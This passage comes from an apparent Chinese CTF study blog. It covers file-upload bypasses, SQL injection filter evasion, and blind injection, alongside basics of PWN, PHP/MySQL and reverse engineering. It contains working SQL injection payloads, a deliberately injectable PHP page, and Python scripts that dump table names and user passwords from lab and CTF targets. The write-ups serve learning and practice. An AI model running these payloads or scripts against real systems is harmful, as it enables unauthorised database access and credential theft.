($_FILES['upload_file']['type'] == 'image/gif')) &#123; if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $UPLOAD_ADDR . '/' . $_FILES['upload_file']['name'])) &#123; $img_path = $UPLOAD_ADDR . $_FILES['upload_file']['name']; $is_upload = true; &#125; &#125; else &#123; $msg = '文件类型不正确，请重新上传！'; &#125; &#125; else &#123; $msg = $UPLOAD_ADDR.'文件夹不存在,请手工创建！'; &#125;&#125; 这里对文件 MIME 类型进行了限制，只需要用 burpsuite 抓包后，将Content-Type修改为image/jpeg或image/gif或image/png，放包后上传成功 pass-11源码： 1234567891011121314151617181920$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else&#123; $msg = '上传失败！'; &#125; &#125; else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; &#125;&#125; 这里由于有 jpg、png、gif 的白名单，需要想办法绕过。然后在接收到文件后还会对文件修改名字并最后存为相应格式的文件。故这里先将上传的文件修改为白名单中的格式，再把文件最后存储的位置通过%00 对后面的后缀名截断 实验吧之上传绕过bypass the upload格式：flag{}解题链接 0x00 截断上传12345&lt;%path=\"upfiles/picture/\"file=\"20180321.jpg\"upfilename=path &amp; file '最后的上传地址%&gt; upfilename即为最终名字，意思为如果地址为picture/1.php+，文件名为1.jpg则最终上传上去的文件路径为picture/1.php+1.jpg。0x00 截断的思路即为将+之后的内容忽略掉使上传文件1.jpg最终上传到1.php中。 先随便上传一个图片文件，提示需要上传 php 文件。同样上传 php 文件，提示需要上传其他格式文件。 这里就需要用到 0x00 截断。提交图片后使用 burpsuite 抓包，在/uploads/后面加上1.php+。 然后在 hex 里把+对应的十六进制改为00。 修改完成后得到 flag。 参考网站http://www.php.cn/php-weizijiaocheng-359309.htmlhttps://blog.csdn.net/zhanghw0917/article/details/46793847https://www.cnblogs.com/bmjoker/p/9141322.html","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"web","slug":"web","permalink":"qianfei11.coding.me/tags/web/"}]},{"title":"WEB入门（二）","slug":"WEB入门（二）","date":"2018-07-04T05:50:22.000Z","updated":"2019-08-26T05:49:16.282Z","comments":true,"path":"2018/07/04/WEB入门（二）/","link":"","permalink":"qianfei11.coding.me/2018/07/04/WEB入门（二）/","excerpt":"今天学姐复习了前天的数字型和字符型注入，讲了 SQL 注入中可能出现的过滤以及绕过的方式，以及布尔型盲注和时间型盲注。","text":"今天学姐复习了前天的数字型和字符型注入，讲了 SQL 注入中可能出现的过滤以及绕过的方式，以及布尔型盲注和时间型盲注。 带过滤的 SQL 注入SQL 注入的过程中有些特定的字符或者字符串会被过滤，数据库无法了解正确的查询语句。 如何绕过过滤运用编码技术绕过 ASCII 码 CHAR(101, 97, 115, 116)即等价于east URL 编码 0x61646D696E即等价于admin 重复例如： 12seleselectctadmadminin 大小写交替例如： 12SeLEctUnIOn 空格的绕过 用两个空格或者 TAB 代替 %a0 代替 /**/代替 用括号()代替 用+代替 用花括号{}代替 用单引号或双引号代替 关键表名过滤绕过information_schema(这里空格).(这里空格)tables 过滤等号用 like 可以替代 过滤引号0x7573657273即等于&quot;users&quot; 过滤大于小于号函数 greatest()和 least()分别替代(&gt;)和(&lt;) 例如： 1select * from users where id=1 and ascii(substr(database(),1,1))&gt;64 等价于 1select * from users where id=1 and greatest(ascii(substr(database(),1,1)),64)=64 过滤逗号substr(str,1,1)等价于substr(str from 1 for 1) SLEEP 函数中不能用数字用 pi()和 ceil()过滤 1sleep(ceil(pi())) 过滤注释符（#、–+）用闭合的方式： 11&apos; and &apos;1 宽字节注入在 MYSQL 中是用 GBK 编码时，会认为两个字符为一个汉字。宽字节注入即通过增加一个字符来过滤掉转义字符前的反斜杠 比如“\\’”的 urlencode 编码为%5c%27，在前面加上%df，会使得%df%5c 构成一个汉字，%27 则作为一个单独的单引号 order by 被过滤使用 into 变量来绕过： 1select * from users limit 1,1 into @a,@b,@c 在本地一张有六个字段的表中测试： 利用等价函数 hex()、bin() ==&gt; ascii() sleep() ==&gt; benchmark() concat_ws() ==&gt; group_concat() mid()、substr()==&gt; substring() @@user ==&gt; user() @@datadir ==&gt; datadir() MYSQL 条件注释利用1/*!..*/ 以上语句在其他数据库中不执行，但在 MYSQL 中执行 1/*!50000...*/ 以上语句在 50000 版本以上不执行，否则必执行，用于过滤正则表达式 盲注铁盆对 SQL 回显注入的解释： 1我问你叫什么名字，你回答你叫奥特曼。 而 SQL 盲注是相反的，即不直接显示搜索到的结果，而从其他方式来推断得出结果的 SQL 注入 SQL 盲注常用函数： if 和 case when：用于时间盲注 substring、substr、mid 等：用于截断字符串 ascii：使字符变成 ASCII 码 limit offset：用于猜取内容 布尔盲注即只有 TRUE 和 FALSE 两种状态，过程中需要猜测，直到正确为止 铁盆箴言： 123我问你叫什么名字，你只会说是和不是(ture false)。于是就，我问你叫不叫李狗蛋呀，不是。叫不叫王大花呀，不是。一直猜到是为止。但是猜也讲究技巧，一个字一个字的猜的效率比一起猜三个字效率不知道高几倍。 判断是否有盲注点 121&apos; and 1=1 # 返回TRUE1&apos; and 1=2 # 返回FALSE，并且没有返回 即 SQL 语句执行成功和失败的返回界面存在某种固定的差异 猜解库名、表名、列名、内容 12341&apos; and substr(database(),1,1)=&apos;a&apos; # 猜解库名1&apos; and substr((select group_concat(table_name) from information_schema.tables where table_schema=&apos;DatabaseName&apos;),1,1)=&apos;a&apos; # 猜解表名1&apos; and substr((select group_concat(column_name) from information_schema.columns where table_name=&apos;TableName&apos;),1,1)=&apos;a&apos; # 猜解列名1&apos; and substr((select group_concat(SomeThing) from DatabaseName.TableName),1,1)=&apos;a&apos; # 猜解表名 以上即为基本的猜解过程 时间盲注即对一个命令只有一个固定的反应，如果是正确的就会等待一定的时间再反应，如果错误立即反应 铁盆箴言： 12我问你叫什么名字，无论对错，你只会 啊 的叫一声。于是就，是 = 让你立马啊，不是 = 让你过一会再啊，以此区分，就便成布尔型一样了。 判断是否有盲注点 121&apos; and if(1=1,sleep(5),1) # 延迟返回为TRUE1&apos; and if(1=2,sleep(5),1) # 不延迟返回为FALSE 基本与布尔盲注类似。 猜解库名、表名、列名、内容 12341&apos; and if((substr(database(),1,1)=&apos;a&apos;),sleep(5),1) # 猜解库名1&apos; and if((substr((select group_concat(table_name) from information_schema.tables where table_schema=&apos;DatabaseName&apos;),1,1)=&apos;a&apos;),sleep(5),1) # 猜解表名1&apos; and if((substr((select group_concat(column_name) from information_schema.columns where table_name=&apos;TableName&apos;),1,1)=&apos;a&apos;),sleep(5),1) # 猜解列名1&apos; and if((substr((select group_concat(SomeThing) from DatabaseName.TableName),1,1)=&apos;a&apos;),sleep(5),1) # 猜解表名 以上即为基本的猜解过程。 DVWA 之 SQL Injection上课没有认真听，DVWA 安全级别一直开在 high，试了好久都做不出。下面就记录一下解题过程。 判断注入类型 判断字段数 猜解库名、表名、列名 获取密码 题目源码12345678910111213141516171819202122232425262728&lt;?phpif(isset($_GET['Submit']))&#123; // Retrieve data $id = $_GET['id']; $getid = \"SELECT first_name, last_name FROM users WHERE user_id = '$id'\"; $result = mysql_query($getid) or die('&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' ); $num = mysql_numrows($result); $i = 0; while ($i &lt; $num) &#123; $first = mysql_result($result,$i,\"first_name\"); $last = mysql_result($result,$i,\"last_name\"); echo '&lt;pre&gt;'; echo 'ID: ' . $id . '&lt;br&gt;First name: ' . $first . '&lt;br&gt;Surname: ' . $last; echo '&lt;/pre&gt;'; $i++; &#125;&#125;?&gt; SQL-LABS-MASTER这里有个很大的坑。因为自己是在虚拟机上跑的 PHPSTUDY，想用脚本跑盲注的时候觉得有点麻烦，就直接用女朋友的电脑了。但是在女朋友的电脑上发现开不了 APACHE，只能用 NGINX，然后就发现各种脚本跑不出，手注也不行，但是在别人的电脑上明明能跑啊。 还好有牛逼的啦啦大哥哥帮忙才发现了漏洞。 在 PHP 的配置文件 php-ini 中发现参数 agc_quotes_gpc 是 on 的，即会对注入时的单引号进行转义，原本的注入点就很难被注入。修改成 off 之后即可 less-5根据测试可以判断这里为布尔盲注 脚本如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import requestsurl = \"http://127.0.0.1/sqli-labs-master/less-5/index.php?id=\"payload = \"abcdefghijklmnopqrstuvwxyz1234567890!@#&#123;&#125;_-=+[]&amp;();\"def get_databse(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and substr(database(),&#123;&#125;,1)='&#123;&#125;'%23\".format(i, ch) r = requests.get(url + sql) if(len(r.text) == 704): res += ch print(res) break print(\"Database: \", res)def get_tables(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and substr((select group_concat(table_name separator ';') from information_schema.tables where table_schema='security'),&#123;&#125;,1)='&#123;&#125;'%23\".format(i, ch) r = requests.get(url + sql) if(len(r.text) == 704): res += ch print(res) break print(\"Table names: \", res)def get_columns(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and substr((select group_concat(column_name separator ';') from information_schema.columns where table_name='users' and table_schema=database()),&#123;&#125;,1)='&#123;&#125;'%23\".format(i, ch) r = requests.get(url + sql) if(len(r.text) == 704): res += ch print(res) break print(\"Column names: \", res)def get_flag(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and substr((select group_concat(password separator ';') from security.users),&#123;&#125;,1)='&#123;&#125;'%23\".format(i, ch) r = requests.get(url + sql) if(len(r.text) == 704): res += ch print(res) break print(\"Flag: \", res)if __name__ == '__main__': # get_databse() # 库名：security # get_tables() # 表名：emails;referers;uagents;users # get_columns() # 列名：1.id;email_id 2.id;referer;ip_address 3.id;uagent;ip_address;username 4.id;username;password # 根据以上的结果可以认为需要找的东西在users表中的password字段 get_flag() # dumb;i-kill-you;p@ssword;crappy;stupidity;genious;mob!le;admin;admin1;admin2;admin3;dumbo;admin4 最后看一看网页源码，其实实现还是很简单的 less-9根据测试判断为时间盲注 脚本如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import requestsurl = \"http://127.0.0.1/sqli-labs-master/less-9/index.php?id=\"payload = \"abcdefghijklmnopqrstuvwxyz1234567890!@#&#123;&#125;_-=+[]&amp;();\"def get_databse(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and if((substr(database(),&#123;&#125;,1)='&#123;&#125;'),sleep(4),1)%23\".format(i, ch) try: r = requests.get(url + sql, timeout=3.9) except requests.exceptions.ReadTimeout: res += ch print(res) break print(\"Database: \", res)def get_tables(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and if((substr((select group_concat(table_name separator ';') from information_schema.tables where table_schema='security'),&#123;&#125;,1)='&#123;&#125;'),sleep(4),1)%23\".format(i, ch) try: r = requests.get(url + sql, timeout=3.9) except requests.exceptions.ReadTimeout: res += ch print(res) break print(\"Table names: \", res)def get_columns(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and if((substr((select group_concat(column_name separator ';') from information_schema.columns where table_name='uagents' and table_schema=database()),&#123;&#125;,1)='&#123;&#125;'),sleep(4),1)%23\".format(i, ch) try: r = requests.get(url + sql, timeout=3.9) except requests.exceptions.ReadTimeout: res += ch print(res) break print(\"Column names: \", res)def get_flag(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"1' and if((substr((select group_concat(password separator ';') from security.users),&#123;&#125;,1)='&#123;&#125;'),sleep(4),1)%23\".format(i, ch) try: r = requests.get(url + sql, timeout=3.9) except requests.exceptions.ReadTimeout: res += ch print(res) break print(\"Flag: \", res)if __name__ == '__main__': # get_databse() # 库名：security # get_tables() # 列名：emails;referers;uagents;users # get_columns() # 表名：1.id;email_id 2.id;referer;ip_address(ip_addkess) 3.id;uagent;ip_address;username 4.id;username(usernahe);password(passkord) # 由于时间盲注会受到网络的影响，需要多试几次来提高结果的精确度 # 根据以上的结果可以认为需要找的东西在users表中的password字段 get_flag() # dumb;i0kill-you;p@ssword;crappyustupidity;genious;mob!le;admie;admin1;admin2;admin3;dumbo0dmin4 源码如下： less-25就是过滤了 AND 和 OR，其他的话和 DVWA 的 LOW LEVEL SQL INJECTION 是一样的 这里 information_schema 库名中也有 or，要记得双写 password 中的 or 也会被过滤 less-26已经能猜到表中有三个字段，所以就不测字段，然后用%A0 替代空格，用%26%26(&amp;&amp;)替代 AND，写出 payload： 10%27%A0union%A0select%A01,database(),3%26%26%271 因为注释符都被过滤了，所以语句最后通过加上“and ‘1”来绕过 网页源码是这样的，过滤了好多东西： less-27用大小写交替来绕过过滤，其他过滤和上一题相同，于是直接写出 payload： 10%27uNion%a0SeleCt%a01,database(),3%a0%26%26%271 网页源码： 实验吧简单的 sql 注入简单的 sql 注入通过注入获得 flag 值（提交格式：flag{}）。解题链接 这里过滤了很多关键字，需要尝试多次以后才能构造出正确的 payload。以下为每一步的 payload。 获取库名： 1' unionunion selectselect database() ' 获取表名： 1' unionunion selectselect table_name fromfrom information_schema.tables wherewhere table_table_schemaschema='web1 获取列名： 1' unionunion selectselect column_namcolumn_namee fromfrom information_schema.coluinformation_schema.columnsmns wherewhere table_table_schemaschema='web1' andand table_name='flag 得到 flag： 1' unionunion selectselect flag fromfrom web1.flag wherewhere '1'='1 简单的 sql 注入 3mysql 报错注入格式：flag{}解题链接 依次输入1 and 1=1和1 and 1=2，发现存在布尔盲注。 经过上一题直接猜测表名为flag（如果和上一题一样就可以直接写爆破 flag 的脚本了），返回 hello，说明确实有flag这个表。那么就可以直接写脚本爆破了。 直接爆破 flag 表 flag 字段得到 flag。脚本如下： 12345678910111213141516171819import requests, repayload = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&#123;&#125;_!@#$^&amp;*().-\"url = \"http://ctf5.shiyanbar.com/web/index_3.php\"def get_flag(): res = \"\" for i in range(1, 100): print(i) for ch in payload: sql = \"?id=1' and (select flag from flag) like '&#123;&#125;&#123;&#125;%'%23\".format(name, ch) r = requests.get(url + sql) if r.text.find('Hello!') != -1: res += ch print(res) break print(\"flag: \" + res)if __name__ == '__main__': get_flag() 参考网站https://www.2cto.com/database/201607/529000.html","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"web","slug":"web","permalink":"qianfei11.coding.me/tags/web/"}]},{"title":"PWN入门（一）","slug":"PWN入门（一）","date":"2018-07-03T02:32:36.000Z","updated":"2019-08-26T05:53:07.756Z","comments":true,"path":"2018/07/03/PWN入门（一）/","link":"","permalink":"qianfei11.coding.me/2018/07/03/PWN入门（一）/","excerpt":"学好二进制必须先打好基础。","text":"学好二进制必须先打好基础。 了解了电脑中的程序如何运行，以及栈在程序运行时是如何变化的。 程序运行基本原理CPU 访问快慢的速度依次为：寄存器-&gt;缓存-&gt;内存-&gt;硬盘。 硬盘用于永久存储所有的数据。当程序运行时，程序内容会被放进内存中，占用内存的空间。缓存和寄存器则相对速度更快，作为数据和 CPU 之间连接的桥梁。 寄存器CPU 内部用来存放数据的一些小型存储区域，用来暂时存放参与运算的数据和运算结果。和 CPU 速度相当，空间比较小在 kb 级别。CPU 访问寄存器的速度是最快的。寄存器是一种容量有限的存储器，并且非常小，因此只把一些计算机的指令等一些计算机频繁用到的数据存储在其中，加快直接同内存读取指令和读写数据的速度。 缓存（CACHE）存在于内存与 CPU 之间的存储器，容量比较小但速度比内存高得多，接近于 CPU 的速度，比寄存器要慢 1 倍左右，但是空间可以达到 MB 级别。高速缓存在 CPU 要频繁访问内存中的一些数据时，如果每次都从内存中去读，花费的时间会更多，因此在寄存器和内存之间有了缓存，把 CPU 要频繁访问的一些数据存储在缓冲中，这样效率就会更高。但需要注意的是，缓冲的大小也是很小的，不能存放大量的数据。缓存又可以分为一级和二级缓存，一级的速度大于二级的速度。CPU 向内存读取数据时，首先查询缓存区是否有对应数据，如果有则直接读取，没有再从内存中读取。 内存计算机运行过程中的存储主力，用于存储 指令（编译好的代码段），运行中的各个静态，动态，临时变量，外部文件的指针等等。寄存器和高速缓存只是加速存储速度的中间部件，原始运行文件都是先加入到内存中，因此内存的大小决定了一个可运行程序的最大大小。速度比缓存要慢 10 倍左右，但是空间可以达到 GB 级别，当前个人电脑一般都不小于 4G。分为只读（ROM）和随机存储器（RAM）。 硬盘用来存储需要永久存储的文件，归入外存储器，访问速度比内存要慢上万倍，但是价格也比较便宜，空间也很大。 ASCII 码 123456#include&lt;stdio.h&gt;int main()&#123; printf(\"%d\\n\", 'A'); printf(\"%c\\n\", 65);&#125; 小端序数据的高位字节存放在地址的高端，低位字节存放在地址的低端 不同类型数据的字节长度 sizeof(int): 4 bit sizeof(short): 2 bit sizeof(float): 4 bit sizeof(double): 8 bit sizeof(char): 1 bit 不同类型数据的小端序存储方式 int 0x12345678: 78 56 34 12 char [] “1234”: 30 31 32 33 00 short 0xdead: ad de short 0x12345678: 34 12 78 56 栈 先进后出 从高地址向低地址延伸 作用： 暂时保存变量 调用函数时传递参数 保存函数返回地址 调试 SWAP 程序12345678910111213141516#include&lt;stdio.h&gt;void swap(int *aa, int *bb)&#123; int cc = *aa; *aa = *bb; *bb = cc;&#125;int main()&#123; int a = 100, b = 2; swap(&amp;a, &amp;b); printf(\"%d %d\\n\", a, b); return 0;&#125; 表格模拟程序执行时的栈： ADDRESS VALUE NAME 0x7ffee7574978 2 b 0x7ffee7574974 100 a 0x7ffee7574970 0x7ffee7574978 bb 0x7ffee757496c 0x7ffee7574974 aa 0x7ffee7574968 ?? cc 流程图模拟程序执行时的栈： 以下为在 mac 下反汇编出的代码，基本和 linux 下的一致，但是和 windows 下的有一定区别： 12345678910111213141516 0x10958ff10 &lt;+0&gt;: pushq %rbp 0x10958ff11 &lt;+1&gt;: movq %rsp, %rbp 0x10958ff14 &lt;+4&gt;: movq %rdi, -0x8(%rbp) 0x10958ff18 &lt;+8&gt;: movq %rsi, -0x10(%rbp)-&gt; 0x10958ff1c &lt;+12&gt;: movq -0x8(%rbp), %rsi 0x10958ff20 &lt;+16&gt;: movl (%rsi), %eax 0x10958ff22 &lt;+18&gt;: movl %eax, -0x14(%rbp) 0x10958ff25 &lt;+21&gt;: movq -0x10(%rbp), %rsi 0x10958ff29 &lt;+25&gt;: movl (%rsi), %eax 0x10958ff2b &lt;+27&gt;: movq -0x8(%rbp), %rsi 0x10958ff2f &lt;+31&gt;: movl %eax, (%rsi) 0x10958ff31 &lt;+33&gt;: movl -0x14(%rbp), %eax 0x10958ff34 &lt;+36&gt;: movq -0x10(%rbp), %rsi 0x10958ff38 &lt;+40&gt;: movl %eax, (%rsi) 0x10958ff3a &lt;+42&gt;: popq %rbp 0x10958ff3b &lt;+43&gt;: retq Linux 下采用的是 AT＆T 的汇编语法格式，Windows 下面采用的是 Intel 汇编语法格式。二者的主要区别在于： 指令操作数的赋值方向是不同的Intel：第一个是目的操作数，第二个是源操作数AT＆T：第一个是源操作数，第二个是目的操作数 指令前缀AT＆T：寄存器前边要加上％，立即数前要加上$Intel：没有这方面的要求 内存单元操作数Intel：基地址使用[]AT&amp;T：基地址使用()比如：intel 中mov ax, [bx]；AT&amp;T 中movl (%eax), %ebx 操作码的后缀AT&amp;T 中操作码后面有一个后缀字母: l 32 位, w 16 位, b 8 位Intel 却使用了在操作数前面加dword ptr, word ptr, byte ptr的格式例如: mov al, bl(Intel)；movb %bl, %al(AT&amp;T) AT＆T 中跳转指令标号后的后缀表示跳转方向，f表示向前，b表示向后 参考网站https://blog.csdn.net/sinat_37138973/article/details/79012270https://blog.csdn.net/younkerjqb/article/details/53432422https://blog.csdn.net/chuchus/article/details/38469403","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"qianfei11.coding.me/tags/pwn/"}]},{"title":"WEB入门（一）","slug":"WEB入门（一）","date":"2018-07-02T04:38:52.000Z","updated":"2019-08-26T05:48:06.582Z","comments":true,"path":"2018/07/02/WEB入门（一）/","link":"","permalink":"qianfei11.coding.me/2018/07/02/WEB入门（一）/","excerpt":"今天上午是葛大佬的课，继续好好做笔记。","text":"今天上午是葛大佬的课，继续好好做笔记。 对数据库的概念更清楚了，通过自己搭建一个有注入的网页对 PHP 和 HTML 的基本函数有了更好的理解。 PHPPHP 脚本以&lt;?PHP开头，以?&gt;结尾，默认文件扩展名为.php。PHP 语句以分号;结尾。 注释12345// 单行注释# 单行注释/*多行注释*/ 变量规则 变量以\\$符号开头 变量名称必须以字母或下划线开头 变量名称不能以数字开头 变量名称只能包含字母数字字符和下划线（A-Z、a-z、0-9以及_） 变量名称对大小写敏感 1234567&lt;?php $a = 'I am a'; $b = 'I am b'; echo '$a'; echo '&lt;br&gt;'; echo \"$b\";?&gt; 三层架构中的信息流 URL统一资源定位符，提供资源（通常是文档）的路径或位置。结构如下： 1协议://授权/路径?查询 GET 请求和 POST 请求HTTP 中定义的客户端可以发送服务器的两种操作 GET从服务器查询数据方式：用?分割 url 和查询的数据 POST向服务器传递数据方式：通过 form 表单传递 PHP 与 MYSQLGET 方法传递参数12345678&lt;?php$id=$_GET['id'];if(!is_numeric($id))&#123; echo \"U r a hacker!&lt;br&gt;\";&#125;else&#123; echo \"Connecting database!&lt;br&gt;\";&#125;?&gt; PS：&lt;br&gt;为换行符 POST 方法传递参数12345&lt;form action=\"test.php\" method=\"post\"&gt;Pls input ur id: &lt;input type=\"text\" name=\"id\" /&gt;&lt;input type=\"submit\" /&gt;&lt;/form&gt;U r NO.&lt;?php echo $_POST['id']; ?&gt; visitor! 与 mysql 相关函数连接数据库1mysql_connect(servername, username, password); 参数 描述 servername 可选。规定要连接的服务器，默认是“localhost:3306” username 可选。规定登陆所使用的用户名，默认是拥有服务器进程的用户名的名称 password 可选。规定登陆所用的密码，默认是“” 选取数据1mysql_query(query, connection); 参数 描述 query 必需。规定要发送的 sql 查询 connection 可选。规定 sql 连接标识符 设置活动的数据库1mysql_select_db(database, connection); 参数 描述 database 必需。规定要选择的数据库 connection 可选。规定 mysql 连接，如未指定，使用上一个连接 获取数据1mysql_fetch_array(data, array_type); 参数 描述 data 可选。规定要使用的数据指针 array_type 可选。规定返回结果 MYSQL 命令行指令更改密码12update mysql.user set password=password('test') where username='root';flush privileges; 查看数据库1show databases; 选择数据库1use mysql; 查看当前数据库所有数据表1show tables; 查看某张表所有字段信息1desc users; 创建数据库1create database mysql; 删除数据库1drop database mysql; 创建表名为 users 的数据表（其中 id 为主键自增）123456create table users( id int auto_increment, username varchar(20), password varchar(50), primary key (`id`)); 修改表名1alter table users rename to users2; 往表中插入数据1insert into users(...) value(...); 查询表中字段的数据类型1show create table mysql; MYSQL 相关命令及注释命令 AND：所有由 AND 连接的条件都为 TRUE，SQL 语句才执行 OR：只要 OR 连接的条件里有一个是 TRUE，SQL 语句就会执行 UNION SELECT：联合查询 GROUP BY：表示按照第几列进行排序 GROUP_CONCAT：将查询结果以一行的形式输出 注释12345-- 单行注释# 单行注释/*多行注释*/ SQL 手注练习 判断有无注入点 判断注入类型 判断表中字段数 UNION 查询库名 UNION 查询表名 UNION 查询字段名 UNION 查询内容（得到 flag） 自己搭建一个 POST 方式的字符型 SQL 注入网站本地数据库如下： 源码如下： 1234567891011121314151617181920212223242526&lt;?PHP$id = $_POST['id'];$conn = mysql_connect('127.0.0.1', 'root', 'root');if($conn)&#123; echo \"Connected success!&lt;br&gt;\";&#125;else&#123; echo \"Connected fail!&lt;br&gt;\";&#125;$db_selected = mysql_select_db('qf', $conn);$sql = \"select * from test1 where id='$id'\";$res = mysql_query($sql, $conn);while($row = mysql_fetch_array($res))&#123; echo \"username: \".$row['username'].\"&lt;br&gt;\"; echo \"age: \".$row['age'].\"&lt;br&gt;\"; echo \"sex: \".$row['sex'].\"&lt;br&gt;\";&#125;mysql_close($conn);echo \"ur sql is:\";echo \"select * from test1 where id='$id'\";?&gt; 1234&lt;form action=\"\" method=\"post\"&gt; Pls input ur id: &lt;input type=\"text\" name=\"id\" /&gt;&lt;br /&gt; &lt;input type=\"submit\" name=\"\" , value=\"submit\" /&gt;&lt;/form&gt; 以下为在本地注入时的过程，与 get 方式的注入过程没有什么差别，所以省去了判断的过程，直接注入 查询库名 查询表名 查询字段名 查询内容（得到 flag）","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"web","slug":"web","permalink":"qianfei11.coding.me/tags/web/"}]},{"title":"RE入门（一）","slug":"RE入门（一）","date":"2018-07-01T05:26:43.000Z","updated":"2019-08-28T05:04:29.574Z","comments":true,"path":"2018/07/01/RE入门（一）/","link":"","permalink":"qianfei11.coding.me/2018/07/01/RE入门（一）/","excerpt":"基础汇编知识以及 OD 的使用。","text":"基础汇编知识以及 OD 的使用。 数值表示二进制-b（binary）、十进制-d（decimalism）、十六进制-h（hexadecimal） 字长： bit：位 byte：字节–1byte=8bit word：字–1word=2byte=16bit dword：双字–1dword=2word=4byte=32bit qword：四字–1qword=2dword=4word=8byte=64bit 通用寄存器 EAX：累加器（accumulator），是加法乘法指令的缺省寄存器。还可以用来存储函数返回值 ECX：重复 REP 和 LOOP 指令的计数器（counter） EDX：用于存放整数除法产生的余数 EBX：在内存寻址时用来存放基地址（base） ESP：当前线程的栈顶指针，压入栈的数据越多，ESP 越小，每入栈一次减小 4 字节 EBP：当前线程的栈底指针 ESI/EDI：源/目标索引寄存器，字符串操作中，DS:ESI 指向源串，ES:EDI 指向目标串。 EIP：存放下一个 CPU 指令的内存地址，执行完后读取下一指令 标志寄存器 CF：进位标志（可检查无符号操作是否溢出） OF：零标志 SF：符号标志 PF：溢出标志（补码溢出） 寄存器寻址 立即数寻址：MOV EAX, 123H 寄存器寻址：MOV EAX, EBX（EBX 中存放操作数） 直接寻址：MOV EAX, [12345678H]（操作数以[]为地址） 寄存器间接寻址：MOV EAX, [EBX]（操作数的地址为 EBX 中存储的值） 基本汇编指令数据传输 指令 作用 MOV 赋值 PUSH 入栈 POP 出栈 LEA 取地址 MOVSX 符号传送 PUSHAD 将所有 32 位通用寄存器压入栈 POPAD 将所有 32 位通用寄存器取出栈 算术运算 指令 作用 ADD 加法 INC 自加 SUB 减法 DEC 自减 CMP 比较 MUL 乘法 DIV 除法 IDIV 符号整除 IMUL 符号乘法 NEG 求补 逻辑运算 指令 作用 AND 与运算 OR 或运算 NOT 非运算 XOR 异或运算 TEST 与运算（只对标志位修改，对操作数没有影响） SHL 逻辑左移 SAL 算术左移 SHR 逻辑右移 SAR 算术右移 ROL 循环左移 ROR 循环右移 RCL 进位循环左移 RCR 进位循环右移 转移指令 指令 作用 JMP 跳转 JA 大于时跳转（&gt;） JNA 不大于时跳转（&lt;=） JAE 大于等于时跳转（&gt;=） JB 小于时跳转（&lt;） JNB 不小于时跳转（&gt;=） JBE 小于等于时跳转（&lt;=） JE 相等时跳转（==） JNE 不等于时跳转（!=） JNBE 不小于等于时跳转（&gt;） JG 大于时跳转（有符号）（&gt;） JNG 不大于时跳转（有符号）（&lt;=） JGE 大于等于时跳转（有符号）（&gt;=） JL 小于时跳转（有符号）（&lt;） JNL 不小于时跳转（有符号）（&gt;=） JLE 小于等于时跳转（有符号）（&lt;=） JNGE 不大于等于时跳转（有符号）（&lt;） JNLE 不小于等于时跳转（有符号）（&gt;） JZ ZF 为 0 时跳转 JNZ ZF 不为 0 时跳转 JS 有符号时跳转 JNS 无符号时跳转 JGE：Jump if Greater or Equal 循环指令 指令 作用 LOOP 循环（改变 ECX 的值） JCXZ 循环（不改变 ECX 的值） 串指令 指令 作用 MOVS[B/W/D] 传送字节串/字串/双字串 CMPS[B/W/D] 比较字节串/字串/双字串 SCAS[B/W/D] 扫描字节串/字串/双字串 LODS[B/W/D] 加载源变址字节串/字串/双字串 STOS[B/W/D] 保存字节串/字串/双字串 REP 重复 其他指令 指令 作用 INT 终止程序 CALL 调用函数 RET 过程返回 NOP 空 CLD 方向清零 OD 初探静态调试与动态调试：静态调试就是在不执行程序的情况下，人工地对源代码的语法和逻辑分析；动态调试则是在编译、链接、运行的整个过程中，观察如寄存器内容、函数执行情况等状态来分析调试 L(og):日志信息 E(xecute modules):模块信息 M(emory map):内存映射信息 T(hreads):线程信息 W(indows):窗口信息 H(andles):句柄信息 C:当前线程上下文 K:调用链信息 …… OD 调试快捷键 快捷键 功能 ctrl+g 跳转到指定位置 ctrl+e 编辑指定区域 space 编辑汇编代码 f4 执行到光标位置处 f2 断点（Int3） ; 添加注释 : 添加标签名 * 返回到正在运行的地方 -(+) 返回到上（下）一个光标处 enter 跟随跳转/跟入调用内部 f3 打开一个新的可执行程序 ctrl+f2 重新运行当前调试的程序 f9 运行选定的程序进行调试 f12 暂时停止被调试程序的执行 f7 单步进入被调试程序的 call 中 f8 步过被调试程序的 call ctrl+f9 执行直到返回 第一次调试（helloworld.exe）关于 PE 文件的 EntryPoint。打开 CFF，将 PE 文件拖入： 其中，ImageBase 和 AddressOfEntryPoint 指向的地址即为 EntryPoint 找到 main 函数 代码执行：通过 F7 单步步入，一步一步执行到弹框跳出时，进入 main 函数 层层推进：通过 F8 单步步过，快速跳过每个函数，跳出弹框后，进入 main 函数 字符串检索：根据弹框上方的字符串，右键智能搜索查找，找到后直接进入 main 函数 API 检索法：通过运行程序可以判断文件句柄是 